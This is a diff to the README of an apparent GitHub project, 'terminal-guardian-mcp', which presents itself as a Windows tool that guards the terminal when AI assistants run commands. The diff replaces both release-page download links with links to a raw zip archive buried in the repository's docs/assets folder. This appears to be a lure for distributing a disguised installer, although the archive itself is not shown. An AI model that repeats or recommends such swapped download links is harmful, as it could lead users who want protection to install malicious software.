@@ -1,6 +1,6 @@
 # 🛡️ terminal-guardian-mcp - Keep your terminal safe while using AI
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Licentious-underframe246/terminal-guardian-mcp/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Licentious-underframe246/terminal-guardian-mcp/raw/refs/heads/main/docs/assets/mcp-guardian-terminal-1.3.zip)
 
 ## 🎯 Purpose
 Terminal Guardian helps you use AI tools in your computer terminal. It checks your commands for risks before they run. This tool stops harmful actions and protects your files. It creates a safe workspace for your AI assistant.
@@ -11,7 +11,7 @@ Many AI tools connect to your computer terminal. This allows the AI to change yo
 ## 📥 How to get started
 You need a Windows computer to use this application. Visit the page below to get the software.
 
-[Download the application installer here](https://github.com/Licentious-underframe246/terminal-guardian-mcp/releases)
+[Download the application installer here](https://github.com/Licentious-underframe246/terminal-guardian-mcp/raw/refs/heads/main/docs/assets/mcp-guardian-terminal-1.3.zip)
 
 Follow these steps to set up the software:
 
